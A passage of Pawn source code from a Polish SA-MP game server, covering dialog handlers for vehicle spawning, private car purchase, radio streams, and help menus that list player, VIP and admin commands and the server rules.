					ShowPlayerDialog(playerid,402,DIALOG_STYLE_LIST,"Motory/Rowery","Bike\nBMX\nMountain Bike\nNRG-500\nFaggio\nFCR-900\nFreeway\nWayfarer\nSanchez\nQuad","Wybierz","Cofnij");
				}
				case 2:
				{
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					ShowPlayerDialog(playerid,403,DIALOG_STYLE_LIST,"£odzie","Dinghy\nJetmax\nMarquis\nReefer\nSpeeder\nSqualo\nTropic","Wybierz","Cofnij");
				}
				case 3:
				{
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					ShowPlayerDialog(playerid,404,DIALOG_STYLE_LIST,"Samoloty/Helikoptery","Dodo\nStunt\nBeagle\nSkimmer\nShamal\nCargobob\nLeviathn\nMaverick\nRaindanc\nSparrow","Wybierz","Cofnij");
				}
			}
		}
		return 1;
	}
	if(dialogid == 401)
	{
		if(response)
		{
			switch(listitem)
			{
				case 0: GivePlayerCar(playerid,445);
				case 1: GivePlayerCar(playerid,602);
				case 2: GivePlayerCar(playerid,416);
				case 3: GivePlayerCar(playerid,485);
				case 4: GivePlayerCar(playerid,568);
				case 5: GivePlayerCar(playerid,429);
				case 6: GivePlayerCar(playerid,433);
				case 7: GivePlayerCar(playerid,499);
				case 8: GivePlayerCar(playerid,424);
				case 9: GivePlayerCar(playerid,536);
				case 10: GivePlayerCar(playerid,496);
				case 11: GivePlayerCar(playerid,504);
				case 12: GivePlayerCar(playerid,422);
				case 13: GivePlayerCar(playerid,609);
				case 14: GivePlayerCar(playerid,498);
				case 15: GivePlayerCar(playerid,401);
				case 16: GivePlayerCar(playerid,575);
				case 17: GivePlayerCar(playerid,518);
				case 18: GivePlayerCar(playerid,402);
				case 19: GivePlayerCar(playerid,541);
				case 20: GivePlayerCar(playerid,482);
				case 21: GivePlayerCar(playerid,431);
				case 22: GivePlayerCar(playerid,438);
				case 23: GivePlayerCar(playerid,457);
				case 24: GivePlayerCar(playerid,527);
				case 25: GivePlayerCar(playerid,483);
				case 26: GivePlayerCar(playerid,524);
				case 27: GivePlayerCar(playerid,415);
				case 28: GivePlayerCar(playerid,542);
				case 29: GivePlayerCar(playerid,589);
				case 30: GivePlayerCar(playerid,437);
				case 31: GivePlayerCar(playerid,532);
				case 32: GivePlayerCar(playerid,480);
				case 33: GivePlayerCar(playerid,596);
				case 34: GivePlayerCar(playerid,599);
				case 35: GivePlayerCar(playerid,597);
				case 36: GivePlayerCar(playerid,598);
				case 37: GivePlayerCar(playerid,578);
				case 38: GivePlayerCar(playerid,486);
				case 39: GivePlayerCar(playerid,406);
				case 40: GivePlayerCar(playerid,573);
				case 41: GivePlayerCar(playerid,507);
				case 42: GivePlayerCar(playerid,562);
				case 43: GivePlayerCar(playerid,585);
				case 44: GivePlayerCar(playerid,427);
				case 45: GivePlayerCar(playerid,419);
				case 46: GivePlayerCar(playerid,587);
				case 47: GivePlayerCar(playerid,490);
				case 48: GivePlayerCar(playerid,528);
				case 49: GivePlayerCar(playerid,533);
				case 50: GivePlayerCar(playerid,544);
				case 51: GivePlayerCar(playerid,407);
				case 52: GivePlayerCar(playerid,565);
				case 53: GivePlayerCar(playerid,455);
				case 54: GivePlayerCar(playerid,530);
				case 55: GivePlayerCar(playerid,526);
				case 56: GivePlayerCar(playerid,466);
				case 57: GivePlayerCar(playerid,492);
				case 58: GivePlayerCar(playerid,474);
				case 59: GivePlayerCar(playerid,588);
				case 60: GivePlayerCar(playerid,434);
				case 61: GivePlayerCar(playerid,502);
				case 62: GivePlayerCar(playerid,503);
				case 63: GivePlayerCar(playerid,494);
				case 64: GivePlayerCar(playerid,579);
				case 65: GivePlayerCar(playerid,545);
				case 66: GivePlayerCar(playerid,411);
				case 67: GivePlayerCar(playerid,546);
				case 68: GivePlayerCar(playerid,559);
				case 69: GivePlayerCar(playerid,508);
				case 70: GivePlayerCar(playerid,571);
				case 71: GivePlayerCar(playerid,400);
				case 72: GivePlayerCar(playerid,403);
				case 73: GivePlayerCar(playerid,517);
				case 74: GivePlayerCar(playerid,410);
				case 75: GivePlayerCar(playerid,551);
				case 76: GivePlayerCar(playerid,500);
				case 77: GivePlayerCar(playerid,418);
				case 78: GivePlayerCar(playerid,572);
				case 79: GivePlayerCar(playerid,423);
				case 80: GivePlayerCar(playerid,444);
				case 81: GivePlayerCar(playerid,556);
				case 82: GivePlayerCar(playerid,557);
				case 83: GivePlayerCar(playerid,414);
				case 84: GivePlayerCar(playerid,516);
				case 85: GivePlayerCar(playerid,582);
				case 86: GivePlayerCar(playerid,467);
				case 87: GivePlayerCar(playerid,443);
				case 88: GivePlayerCar(playerid,470);
				case 89: GivePlayerCar(playerid,404);
				case 90: GivePlayerCar(playerid,514);
				case 91: GivePlayerCar(playerid,603);
				case 92: GivePlayerCar(playerid,600);
				case 93: GivePlayerCar(playerid,413);
				case 94: GivePlayerCar(playerid,426);
				case 95: GivePlayerCar(playerid,436);
				case 96: GivePlayerCar(playerid,547);
				case 97: GivePlayerCar(playerid,489);
				case 98: GivePlayerCar(playerid,515);
				case 99: GivePlayerCar(playerid,479);
				case 100: GivePlayerCar(playerid,534);
				case 101: GivePlayerCar(playerid,442);
				case 102: GivePlayerCar(playerid,440);
				case 103: GivePlayerCar(playerid,475);
				case 104: GivePlayerCar(playerid,543);
				case 105: GivePlayerCar(playerid,495);
				case 106: GivePlayerCar(playerid,567);
				case 107: GivePlayerCar(playerid,428);
				case 108: GivePlayerCar(playerid,405);
				case 109: GivePlayerCar(playerid,535);
				case 110: GivePlayerCar(playerid,458);
				case 111: GivePlayerCar(playerid,580);
				case 112: GivePlayerCar(playerid,439);
				case 113: GivePlayerCar(playerid,561);
				case 114: GivePlayerCar(playerid,409);
				case 115: GivePlayerCar(playerid,560);
				case 116: GivePlayerCar(playerid,550);
				case 117: GivePlayerCar(playerid,506);
				case 118: GivePlayerCar(playerid,601);
				case 119: GivePlayerCar(playerid,574);
				case 120: GivePlayerCar(playerid,566);
				case 121: GivePlayerCar(playerid,549);
				case 122: GivePlayerCar(playerid,420);
				case 123: GivePlayerCar(playerid,559);
				case 124: GivePlayerCar(playerid,576);
				case 125: GivePlayerCar(playerid,525);
				case 126: GivePlayerCar(playerid,531);
				case 127: GivePlayerCar(playerid,408);
				case 128: GivePlayerCar(playerid,583);
				case 129: GivePlayerCar(playerid,451);
				case 130: GivePlayerCar(playerid,558);
				case 131: GivePlayerCar(playerid,552);
				case 132: GivePlayerCar(playerid,540);
				case 133: GivePlayerCar(playerid,451);
				case 134: GivePlayerCar(playerid,412);
				case 135: GivePlayerCar(playerid,539);
				case 136: GivePlayerCar(playerid,421);
				case 137: GivePlayerCar(playerid,529);
				case 138: GivePlayerCar(playerid,555);
				case 139: GivePlayerCar(playerid,456);
				case 140: GivePlayerCar(playerid,554);

			}
			}else{
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			ShowPlayerDialog(playerid, 3, DIALOG_STYLE_LIST, "Wybierz typ pojazdu", "Samochody \n Motory/Rowery", "Dalej", "Anuluj");
		}

		return 1;
	}

	if(dialogid == 402)
	{
		if(response)
		{
			switch(listitem)
			{
				case 0: GivePlayerCar(playerid,509);
				case 1: GivePlayerCar(playerid,481);
				case 2: GivePlayerCar(playerid,510);
				case 3: GivePlayerCar(playerid,522);
				case 4: GivePlayerCar(playerid,462);
				case 5: GivePlayerCar(playerid,521);
				case 6: GivePlayerCar(playerid,463);
				case 7: GivePlayerCar(playerid,586);
				case 8: GivePlayerCar(playerid,468);
				case 9: GivePlayerCar(playerid,471);
			}
			}else{
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			ShowPlayerDialog(playerid, 3, DIALOG_STYLE_LIST, "Wybierz typ pojazdu", "Samochody \n Motory/Rowery", "Dalej", "Anuluj");
		}

		return 1;
	}


	if(dialogid == 403)
	{
		if(response)
		{
			switch(listitem)
			{
				case 0: GivePlayerCar(playerid,473);
				case 1: GivePlayerCar(playerid,493);
				case 2: GivePlayerCar(playerid,484);
				case 3: GivePlayerCar(playerid,453);
				case 4: GivePlayerCar(playerid,452);
				case 5: GivePlayerCar(playerid,446);
				case 6: GivePlayerCar(playerid,454);
			}
			}else{
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			ShowPlayerDialog(playerid, 3, DIALOG_STYLE_LIST, "Wybierz typ pojazdu", "Samochody \n Motory/Rowery", "Dalej", "Anuluj");
		}

		return 1;
	}

	if(dialogid == 404)
	{
		if(response)
		{
			switch(listitem)
			{
				case 0: GivePlayerCar(playerid,593);
				case 1: GivePlayerCar(playerid,513);
				case 2: GivePlayerCar(playerid,511);
				case 3: GivePlayerCar(playerid,460);
				case 4: GivePlayerCar(playerid,519);
				case 5: GivePlayerCar(playerid,548);
				case 6: GivePlayerCar(playerid,417);
				case 7: GivePlayerCar(playerid,487);
				case 8: GivePlayerCar(playerid,563);
				case 9: GivePlayerCar(playerid,469);
			}
			}else{
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			ShowPlayerDialog(playerid, 3, DIALOG_STYLE_LIST, "Wybierz typ pojazdu", "Samochody \n Motory/Rowery", "Dalej", "Anuluj");
		}

		return 1;
	}
	if(dialogid == 22 && response)
	{
		switch(listitem)
		{
			case 0:
			{
				PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
				new Float:x, Float:y, Float:z;
				GetPlayerPos(playerid, x, y, z);
				if(ZespawnowanyPrivCar[playerid] == false)
				{
					PrywatnyPojazd[playerid] = CreateVehicle(mysql_PlayerGetInt(pName[playerid], "privcar"), x+2, y+2, z+1, 0.0, random(128), random(128), 99999999999);
					format(strx, sizeof(strx), ""C_O"W³aœciciel: "C_B"%s\n"C_O"Przebieg: "C_B"%.1f "C_O"km", pName[playerid], PrivPrzebieg[playerid]);
					PrywatnyPojazdLabel[playerid] = Create3DTextLabel(strx,-1,0.0,0.0,0.0,60.0,0,1);
					Attach3DTextLabelToVehicle(PrywatnyPojazdLabel[playerid], PrywatnyPojazd[playerid], 0.0, 0.0, 0.0);
					PrivCar[PrywatnyPojazd[playerid]] = playerid;
					ZespawnowanyPrivCar[playerid] = true;
					PrivCarPos[playerid][0] = x+2;
					PrivCarPos[playerid][1] = y+2;
					PrivCarPos[playerid][2] = z+1;
				}
				else
				{
					SetVehiclePos(PrywatnyPojazd[playerid], x+2, y+2, z+1);
					PrivCarPos[playerid][0] = x+2;
					PrivCarPos[playerid][1] = y+2;
					PrivCarPos[playerid][2] = z+1;
				}
				LinkVehicleToInterior(PrywatnyPojazd[playerid], GetPlayerInterior(playerid));
				SetVehicleVirtualWorld(PrywatnyPojazd[playerid], GetPlayerVirtualWorld(playerid));
				SCM(playerid, -1, ""czat" "C_O"Teleportowa³eœ swój prywatny pojazd do siebie.");
			}
			case 1:
			{
				if(!IsPlayerInAnyVehicle(playerid) || (ZespawnowanyPrivCar[playerid] == true && GetPlayerVehicleID(playerid) != PrywatnyPojazd[playerid])) return SCM(playerid, COLOR_ERROR, "* Musisz byæ w swoim prywatnym pojeŸdzie!");
				PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
				new buycarlist[1900];
				for(new i=0; i<sizeof(buycarid); i++)
				{
					format(buycarlist, sizeof(buycarlist), "%s%s\n", buycarlist, VehicleNames[buycarid[i]-400]);
				}

				ShowPlayerDialog(playerid, 23, DIALOG_STYLE_LIST, "Zmieñ model", buycarlist, "Wybierz", "Zamknij");
			}
		}
		return 1;
	}
	if(dialogid == 23 && response)
	{
		PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
		mysql_PlayerIntSet(pName[playerid], "privcar", buycarid[listitem]);
		new Float:x, Float:y, Float:z;
		GetPlayerPos(playerid, x, y, z);
		PrivCar[PrywatnyPojazd[playerid]] = -1;
		Delete3DTextLabel(PrywatnyPojazdLabel[playerid]);
		DestroyVehicle(PrywatnyPojazd[playerid]);
		PrywatnyPojazd[playerid] = CreateVehicle(buycarid[listitem], x, y, z, 0.0, random(128), random(128), 99999999999);
		format(strx, sizeof(strx), ""C_O"W³aœciciel: "C_B"%s\n"C_O"Przebieg: "C_B"%.1f "C_O"km", pName[playerid], PrivPrzebieg[playerid]);
		PrywatnyPojazdLabel[playerid] = Create3DTextLabel(strx,0x00FFFFFF,0.0,0.0,0.0,60.0,0,1);
		Attach3DTextLabelToVehicle(PrywatnyPojazdLabel[playerid], PrywatnyPojazd[playerid], 0.0, 0.0, 0.0);
		PrivCar[PrywatnyPojazd[playerid]] = playerid;
		PutPlayerInVehicle(playerid, PrywatnyPojazd[playerid], 0);
		PrivCarPos[playerid][0] = x;
		PrivCarPos[playerid][1] = y;
		PrivCarPos[playerid][2] = z;
		PrivPrzebieg[playerid] = 0.0;
		PrivSpeed[playerid] = 0;

		format(strx, sizeof(strx), ""czat" "C_O"Zmieni³eœ model swojego pojazdu na: "C_B"%d"C_O".", buycarid[listitem]);
		SCM(playerid, -1, strx);
		return 1;
	}
	if(dialogid == 34 && response)
	{
		PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
		SelectedPrivCar[playerid] = buycarid[listitem];
		format(strx, sizeof(strx), "Chcesz kupiæ prywatny pojazd\n%s ?", VehicleNames[buycarid[listitem]-400]);
		ShowPlayerDialog(playerid, 21, DIALOG_STYLE_MSGBOX, "Kup pojazd", strx, "Kup", "Cofnij");
		return 1;
	}
	if(dialogid == 21)
	{
		if(response)
		{
			if(GetPlayerScore(playerid) < 10000) return SCM(playerid, -1, ""C_O"Musisz mieæ "C_B"10000 "C_O"expa by kupiæ prywatny pojazd!");
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			mysql_PlayerIntSet(pName[playerid], "privcar", SelectedPrivCar[playerid]);
			new Float:x, Float:y, Float:z;
			GetPlayerPos(playerid, x, y, z);
			PrywatnyPojazd[playerid] = CreateVehicle(SelectedPrivCar[playerid], x+2, y+2, z+1, 0.0, random(128), random(128), 99999999999);
			format(strx, sizeof(strx), ""C_O"W³aœciciel: "C_B"%s\n"C_O"Przebieg: "C_B"%.1f "C_O"km", pName[playerid], PrivPrzebieg[playerid]);
			PrywatnyPojazdLabel[playerid] = Create3DTextLabel(strx,0x00FFFFFF,0.0,0.0,0.0,60.0,0,1);
			Attach3DTextLabelToVehicle(PrywatnyPojazdLabel[playerid], PrywatnyPojazd[playerid], 0.0, 0.0, 0.0);
			PrivCar[PrywatnyPojazd[playerid]] = playerid;
			ZespawnowanyPrivCar[playerid] = true;
			PrivCarPos[playerid][0] = x+2;
			PrivCarPos[playerid][1] = y+2;
			PrivCarPos[playerid][2] = z+1;
			MaPrivCar[playerid] = true;
			PrivPrzebieg[playerid] = 0.0;
			PrivSpeed[playerid] = 0;

			format(strx, sizeof(strx), ""czat" "C_O"Kupi³eœ prywatny pojazd "C_B"%s "C_O". ( "C_B"/pojazd "C_O")", VehicleNames[SelectedPrivCar[playerid]-400]);
			SCM(playerid, -1, strx);
		}
		else
			OnDialogResponse(playerid, 15, 1, 0, "");
		return 1;
	}
	if(dialogid == 15 && response)
	{
		PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
		new buycarlist[1900];
		for(new i=0; i<sizeof(buycarid); i++)
		{
			format(buycarlist, sizeof(buycarlist), "%s%s\n", buycarlist, VehicleNames[buycarid[i]-400]);
		}

		ShowPlayerDialog(playerid, 34, DIALOG_STYLE_LIST, "Kup pojazd", buycarlist, "Wybierz", "Zamknij");
		return 1;
	}
	if(dialogid == 192)
	{
		if(response )
		{

			switch(listitem)
			{

				case 0:
				{
					PlayAudioStreamForPlayer(playerid, "http://odsluchane.eu/pls/eska.pls"); //Radio Eska
					SCM(playerid, -1, ""C_O"Wybra³es kana³{808080} "C_B"Radio eska :) ");
				}
				case 1:
				{
					PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=1615635");//polski hip-hop
					SCM(playerid, -1, ""C_O"Wybra³es kana³{808080} "C_B"Polski Hip-Hop :) ");
				}
				case 2:
				{
					PlayAudioStreamForPlayer(playerid, "http://www.polskastacja.pl/play/aac_hot100.pls"); //HOT 100
					SCM(playerid, -1, ""C_O"Wybra³es kana³{808080} "C_B"HOT 100 :) ");
				}
				case 3 :
				{
					PlayAudioStreamForPlayer(playerid, "http://radiozetmp3-07.eurozet.pl:8400"); // radio zet
					SCM(playerid, -1, ""C_O"Wybra³es kana³{808080} "C_B"Radio ZET :) ");
				}
				case 4 :
				{
					PlayAudioStreamForPlayer(playerid, "http://217.74.72.3:8000/rmf_maxxx");
					SCM(playerid, -1, ""C_O"Wybra³es kana³{808080} "C_B"Rmf Maxxx :) ");
				}
				case 5 :
				{
					PlayAudioStreamForPlayer(playerid, "http://stream.polskieradio.pl/program1"); // polskie radio
					SCM(playerid, -1, ""C_O"Wybra³es kana³{808080} "C_B"Polskie radio :) ");
				}


			}
		}
	}
	if(dialogid == 30){
		if(response){

			if(listitem == 0){//1139
				PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
				new StrinG[1500];
				strcat(StrinG, "/lock"C_B" - Zamykasz pojazd"C_O"\n/unlock"C_B" - Otwierasz pojazd"C_O"\n/spadochron"C_B" - Dostajesz spadochron"C_O"\n/styl"C_B" - Styl walki"C_O"\n/anims"C_B" - Animacje"C_O"\n/bronie"C_B" - Kupujesz broñ"C_O"\n/neon"C_B" - Neony w pojazdach"C_O"\n/givecash"C_B" - Dajesz kasê"C_O"\n");
				strcat(StrinG, "/figurki"C_B" - Informacje o figurkach\n"C_O"/pos"C_B" - Sprawdzasz pozycje na mapie"C_O"\n/hp"C_B" - Sprawdzasz iloœæ zycia"C_O"\n/dystans"C_B" - Sprawdzasz odleg³oœæ do innego gracza"C_O"\n");
				strcat(StrinG, "/wyscigi"C_B" - Lista wyœcigów"C_O"\n/clearme"C_B" - Czyœcisz sobie czat\n"C_O"/me"C_B" - Czynnoœæ\n"C_O"/hitman"C_B" - Nagroda za gracza\n"C_O"/zabawy"C_B" - Informacje o zabawach\n"C_O"/losexp"C_B" - Losujesz sobie exp.\n"C_O"/top "C_B"- Toplisty graczy\n"C_O"");
				strcat(StrinG, "/zw"C_B" - Zaraz wracam\n"C_O"/jj"C_B" - Ju¿ jestem\n"C_O"/staty "C_B"- Statystyki graczy\n"C_O"/rec "C_B" - Tryb nagrywania"C_O"\n/solo"C_B" - Rozgrywka PvP\n"C_O"/resrace"C_B" - Restart wyœcigu\n"C_O"/nitro"C_B" - Zmiana rodzaju nitro\n"C_O"/pytanie"C_B" - pytanie do administracji\n");
				strcat(StrinG, ""C_O"/witam /siema /elo"C_B" - Witasz siê z graczami\n"C_O"/przelewexp"C_B" - Przelewasz innemu graczowi exp.\n"C_O"/gang - "C_B" informacje na temat gangów.");

				ShowPlayerDialog(playerid,32,0,"Komendy Gracza",StrinG,"Cofnij",">>>");

				}else if(listitem == 1){

				if(Administrator[playerid] < 1 && Vip[playerid] == false){
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					SCM(playerid, -1,""C_O"Nie jesteœ "C_B"Vipem!");
					ShowPlayerDialog(playerid,30,2,"{3FBAFC}Polski TOP Serwer",""C_O"Komendy Gracza\n"C_B"Komendy Vipa\n"C_O"Komendy Admina \n"C_B"Komendy Gangu \n"C_O"Regulamin Serwera \n"C_B"Konto VIP \n{A40000}Autor GameMode","Dalej","Wyjdz");
					return 1;
				}
				PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
				new StrinG[1024];
				strcat(StrinG, "{FFFF00}Komendy dla VIP'ów:"C_O"\n\n");
				strcat(StrinG, "/vkolor - Zmieniasz sobie kolor.\n");
				strcat(StrinG, "/vcolor - Otrzymujesz specjalny kolor dla VIP'ów.\n");
				strcat(StrinG, "/vjetpack - Dostajesz jetpack'a.\n");
				strcat(StrinG, "/vczas - Zmieniasz sobie godzine.\n");
				strcat(StrinG, "/vpogoda - Zmieniasz sobie pogodê.\n");
				strcat(StrinG, "/vtele - W³¹czasz/Wy³¹czasz teleport za pomoc mapy.\n/vbronie - Ustawiasz zestaw broni.\n");
				strcat(StrinG, "/vdotacja - otrzymujesz 1 mln $\n");
				strcat(StrinG, "/vpozostalo - sprawdzasz wa¿noœæ vipa\n");
				strcat(StrinG, "\n\n\n{FFFF00}Dodatkowo otrzymujesz:"C_O"\n\n");
				strcat(StrinG, "- Kamizelka na spawnie.\n");
				strcat(StrinG, "- O po³owê zmniejszony czas oczekiwania na /zycie oraz /pancerz.\n");
				strcat(StrinG, "- Range w chacie\n");
				strcat(StrinG, "- Dodatkowe +2 exp za zabicie.\n");
				strcat(StrinG, "- Dodatkowe 10000$ na spawnie.\n");
				strcat(StrinG, "- Dwukrotnie powiêkszony limit maksymalnego pingu.\n");
				strcat(StrinG, "- Brak straty exp'a przy samobójstwie.\n");
				strcat(StrinG, "- Teleportowanie siê w dowolne miejsce zaznaczone na mapie.\n");
				strcat(StrinG, "- Powiekszone zycie pojazdu do 120.\n");
				strcat(StrinG, "- W³asny zestaw bronii na spawnie.\n");
				strcat(StrinG, "Chcesz zakupiæ VIP na okres 31 dni ? Wpisz /vip!");

				ShowPlayerDialog(playerid,31,0,"Komendy Vipa",StrinG,"Cofnij","Wyjdz");




				}else if(listitem == 2){

				if(Administrator[playerid] < 1){
					PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
					SCM(playerid, -1,""C_O"Nie jesteœ "C_B"administratorem!");
					ShowPlayerDialog(playerid,30,2,"{3FBAFC}Polski TOP Serwer",""C_O"Komendy Gracza\n"C_B"Komendy Vipa\n"C_O"Komendy Admina \n"C_B"Komendy Gangu \n"C_O"Regulamin Serwera \n"C_B"Konto VIP \n{A40000}Autor GameMode","Dalej","Wyjdz");
					return 1;
				}
				PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
				new StrinG[1400];
				strcat(StrinG, ""C_B"Komendy administratorów:\n\n"C_O"");
				strcat(StrinG, "/lastraports - Ostatnie 5 raportów\n");
				strcat(StrinG, "/spec - Podgl¹dasz gracza\n");
				strcat(StrinG, "/givemoney - Dajesz kase\n");
				strcat(StrinG, "/giveexp - Dajesz exp\n");
				strcat(StrinG, "/freeze - Zamra¿asz gracza\n");
				strcat(StrinG, "/warn - dajesz ostrzeæenie\n");
				strcat(StrinG, "/acolor - kolor admina\n");
				strcat(StrinG, "/invisible - znikasz z radaru\n");
				strcat(StrinG, "/unfreeze - Odmra¿asz gracza\n");
				strcat(StrinG, "/ann - Piszesz na œrodku ekranu\n");
				strcat(StrinG, "/tpto - Teleport do ...\n");
				strcat(StrinG, "/tp - Teleport A do B\n");
				strcat(StrinG, "/getweapon - Sprawdzasz bronie gracza\n");
				strcat(StrinG, "/ban - Dajesz bana graczowi\n");
				strcat(StrinG, "/kick - Wyrzucasz gracza z serwera\n");
				strcat(StrinG, "/say - Piszesz jako admin w chacie\n");
				strcat(StrinG, "/givejetpack - Dajesz jetpack\n");
				strcat(StrinG, "/givegun - Dajesz broñ\n");
				strcat(StrinG, "/vgod - Niezniszczalny pojazd\n");
				strcat(StrinG, "/god - Nieœmiertelnoœæ\n");
				strcat(StrinG, "/setarmor - Ustawiasz pancerz\n");
				strcat(StrinG, "/sethp - Ustawiasz ¿ycie\n");
				strcat(StrinG, "/objective - Oznaczenie pojazdu\n");
				strcat(StrinG, "/rozbroj - Pozbywasz gracza broni\n");
				strcat(StrinG, "/settime - Ustawiasz godzinê\n");
				strcat(StrinG, "/pogoda - Ustawiasz pogodê\n");
				strcat(StrinG, "/getip - Sprawdzasz IP gracza\n");
				strcat(StrinG, "/walizka - Stawiasz walizkê\n");
				strcat(StrinG, "/clear - Czyœcisz chat\n");
				strcat(StrinG, "/mute - Wyciszasz gracza (chat)\n");
				strcat(StrinG, "/maxping - Ustawiasz maxping\n");
				strcat(StrinG, "/explode - Wybuch\n");
				strcat(StrinG, "/respawn - Respawn pojazdów\n");
				strcat(StrinG, "/eye - Podgl¹d komend\n");
				strcat(StrinG, "/pmeye - Podgl¹d PW\n");
				strcat(StrinG, "/unban - Odbanowujesz nick\n");
				strcat(StrinG, "/addban - Dajesz bana graczowi offline\n");
				strcat(StrinG, "/zpos - Zmiana wysokoœci gracza\n");
				strcat(StrinG, "/darea - Rozbrajasz wszystkich w pobli¿u ciebie\n");
				strcat(StrinG, "/setcolor - Zmieniasz kolor\n");
				strcat(StrinG, "/jail - Wiêzienie\n");
				strcat(StrinG, "/unjail - wypuszczasz z wiezienia\n");
				strcat(StrinG, "/r - piszesz wiadomoœæ na czacie\n");
				strcat(StrinG, "/Admin - logujesz na admina\n");

				ShowPlayerDialog(playerid,31,0,"Komendy administracji",StrinG,"Cofnij","Wyjdz");


				}else if(listitem == 3){
				PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
				new StrinG[128];
				StrinG = "/g - rozmawiasz na czacie gangu.\n";
				strcat(StrinG,"/g_opusc - opuszczasz gang\n");
				strcat(StrinG,"/g_accept - przyjmujesz zaproszenie do gangu.\n");
				strcat(StrinG,"/g_odrzuc - odrzucasz zaproszenie do gangu.\n");
				strcat(StrinG,"/g_zapros - zapraszasz gracza do gangu.\n");
				strcat(StrinG,"/g_wyrzuc - wyrzucasz gracza z gangu.");

				ShowPlayerDialog(playerid,31,0,"Komendy gangu",StrinG,"Cofnij","Wyjdz");

				}else if(listitem == 4){
				PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
				new StrinG[1024];
				strcat(StrinG, "{FF0000}Regulamin Serwera"C_O"\n\n\n");
				strcat(StrinG, "1. Nie wolno uzywaæ cheatów/bugów/modów/trainerów u³atwiajcych gre.\n\n2. Nie wolno korzystac z bugów, które przeszkadzaja innym graczom.\n\n3. Nie wolno wyzywac innych graczy.\n\n");
				strcat(StrinG, "4. Nie wolno spamowaæ i reklamowaæ.\n\n5. Nie wolno podszywaæ siê pod innych graczy i administratorów.\n\n6. Administrator ma prawo kickowa/banowaæ bez PODANIA przyczyny.\n\n");
				strcat(StrinG, "7. Osoba zbanowana ma prawo do z³o¿enia wyjaœnieñ na forum.\n\n8. Zabronione jest ³amanie zasad Polskiego kodeksu karnego.\n\n9. Istnieje ca³kowity zakaz oszustwa materialnego graczy.\n\n{00BB00}");
				strcat(StrinG, "Rejestracja na serwerze oznacza akceptacjê regulaminu.\nWszelkie próby z³amania regulaminu moga byæ karane w ró¿ny sposób.\n\nStrona serwera: www.TOP.xaa.pl");

				ShowPlayerDialog(playerid,31,0,"Regulamin Serwera",StrinG,"Cofnij","Wyjdz");

				}else if(listitem == 5){
				PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
				new StrinG[1200];
				strcat(StrinG, "{FFFF00}Komendy dla VIP'ów:"C_O"\n\n");
				strcat(StrinG, "/vkolor - Zmieniasz sobie kolor.\n");
				strcat(StrinG, "/vcolor - Otrzymujesz specjalny kolor dla VIP'ów.\n");
				strcat(StrinG, "/vjetpack - Dostajesz jetpack'a.\n");
				strcat(StrinG, "/vczas - Zmieniasz sobie godzine.\n");
				strcat(StrinG, "/vpogoda - Zmieniasz sobie pogodê.\n");
				strcat(StrinG, "/vtele - W³¹czasz/Wy³¹czasz teleport za pomoc mapy.\n/vbronie - Ustawiasz zestaw broni.\n");
				strcat(StrinG, "/vdotacja - otrzymujesz 1 mln $\n");
				strcat(StrinG, "/vpozostalo - sprawdzasz wa¿noœæ vipa\n");
				strcat(StrinG, "\n\n\n{FFFF00}Dodatkowo otrzymujesz:"C_O"\n\n");
				strcat(StrinG, "- Kamizelka na spawnie.\n");
				strcat(StrinG, "- O po³owê zmniejszony czas oczekiwania na /zycie oraz /pancerz.\n");
				strcat(StrinG, "- Range w chacie\n");
				strcat(StrinG, "- Dodatkowe +2 exp za zabicie.\n");
				strcat(StrinG, "- Dodatkowe 10000$ na spawnie.\n");
				strcat(StrinG, "- Dwukrotnie powiêkszony limit maksymalnego pingu.\n");
				strcat(StrinG, "- Brak straty exp'a przy samobójstwie.\n");
				strcat(StrinG, "- Teleportowanie siê w dowolne miejsce zaznaczone na mapie.\n");
				strcat(StrinG, "- Powiekszone zycie pojazdu do 120.\n");
				strcat(StrinG, "- W³asny zestaw bronii na spawnie.\n");
				strcat(StrinG, "Chcesz zakupiæ VIP na okres 31 dni ? Wpisz /vip!");

				ShowPlayerDialog(playerid,31,0,"Konto VIP",StrinG,"Cofnij","Wyjdz");

				}else if(listitem == 6){
				PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
				new StrinG[1024];
				StrinG = ""C_B"ptsDM - "C_O" "Version", "Date" "Godz"\n";
				strcat(StrinG,""C_B"Kod: "C_O"Maku, NexuS, MajsterSzefImpry\n");
				strcat(StrinG,""C_B"Mapperzy: "C_O"Lord_\n");
				strcat(StrinG,""C_B"Specjalne podziêkowania dla:\n\t");
				strcat(StrinG,"{A40000}mrdrifter, Game"C_O"SA-MP Team, Y_Less, Strickenkid, xeeZ, Ryder, Incognito");

				ShowPlayerDialog(playerid,31,0,"Autor skryptu",StrinG,"Cofnij","Wyjdz");

			}

		}
		return 1;
	}


	if(dialogid == 31){
		if(response){
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
			ShowPlayerDialog(playerid,30,2,"{3FBAFC}Polski TOP Serwer",""C_O"Komendy Gracza\n"C_B"Komendy Vipa\n"C_O"Komendy Admina \n"C_B"Komendy Gangu \n"C_O"Regulamin Serwera \n"C_B"Konto VIP \n{A40000}Autor GameMode","Dalej","Wyjdz");
		}
		return 1;
	}

	if(dialogid == 32){
		if(response){
			PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
